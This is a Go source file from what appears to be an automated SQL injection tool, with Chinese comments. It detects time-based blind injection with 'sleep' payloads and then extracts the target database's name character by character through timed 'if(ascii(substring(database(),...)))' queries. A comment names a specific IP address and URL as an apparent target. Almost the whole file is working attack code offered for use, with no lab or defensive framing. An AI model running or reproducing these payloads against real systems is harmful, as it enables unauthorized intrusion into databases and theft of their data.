package pkg

import (
	"fmt"
	"net/http"
	"net/url"
	"time"
)

// http://47.108.225.199:8080/?id=1
func Request(host string) error {
	//测试是否存在sql注入
	ex, err := checkSql(host)
	if err != nil {
		fmt.Errorf("检测失败")
		return err
	}
	if ex == 1 {
		fmt.Println("存在sql注入漏洞")
		err = ErrorInject(host)
		if err != nil {
			return err
		}
	}
	return nil

}

func checkSql(host string) (int, error) {
	// 测试正常请求的响应时间作为基准
	normalStart := time.Now()
	normalReq, err := http.Get(host)
	if err != nil {
		return 0, err
	}
	normalReq.Body.Close()
	normalDuration := time.Since(normalStart)

	// 测试带sleep的payload
	payload := host + url.QueryEscape(" and sleep(5)")
	fmt.Printf("Testing payload: %s\n", payload)
	startRequestTime := time.Now()
	req, err := http.Get(payload)
	if err != nil {
		return 0, err
	}
	defer req.Body.Close()
	endRequestTime := time.Since(startRequestTime)

	// 如果响应时间明显超过正常时间（超过3秒），可能存在时间盲注
	if req.StatusCode == 200 && endRequestTime > normalDuration+3*time.Second {
		fmt.Printf("Time-based SQL injection detected! Response time: %v\n", endRequestTime)
		return 1, nil
	}

	// 测试布尔盲注
	booleanResult, err := checkBooleanInjection(host)
	if err != nil {
		return 0, err
	}
	if booleanResult == 1 {
		return 1, nil
	}

	return 0, nil
}

// 基于时间的盲注
func TimeBasedInject(host string) error {
	fmt.Println("Starting Time-based blind SQL injection...")

	// 获取数据库名长度
	dbNameLength, err := getDatabaseNameLengthTime(host)
	if err != nil {
		return err
	}
	fmt.Printf("Database name length: %d\n", dbNameLength)

	// 获取数据库名
	dbName, err := getDatabaseNameTime(host, dbNameLength)
	if err != nil {
		return err
	}
	fmt.Printf("Database name: %s\n", dbName)

	return nil
}

// 基于时间获取数据库名长度
func getDatabaseNameLengthTime(host string) (int, error) {
	for i := 1; i <= 50; i++ {
		payload := fmt.Sprintf(" and if(length(database())=%d,sleep(3),0)", i)
		url := host + url.QueryEscape(payload)

		start := time.Now()
		req, err := http.Get(url)
		if err != nil {
			continue
		}
		req.Body.Close()
		duration := time.Since(start)

		if duration > 2*time.Second {
			return i, nil
		}
	}
	return 0, fmt.Errorf("could not determine database name length")
}

// 基于时间获取数据库名
func getDatabaseNameTime(host string, length int) (string, error) {
	dbName := ""

	for i := 1; i <= length; i++ {
		for j := 32; j <= 126; j++ { // ASCII可打印字符
			payload := fmt.Sprintf(" and if(ascii(substring(database(),%d,1))=%d,sleep(3),0)", i, j)
			url := host + url.QueryEscape(payload)

			start := time.Now()
			req, err := http.Get(url)
			if err != nil {
				continue
			}
			req.Body.Close()
			duration := time.Since(start)

			if duration > 2*time.Second {
				dbName += string(rune(j))
				fmt.Printf("Found character %d: %c\n", i, rune(j))
				break
			}
		}
	}

	return dbName, nil
}
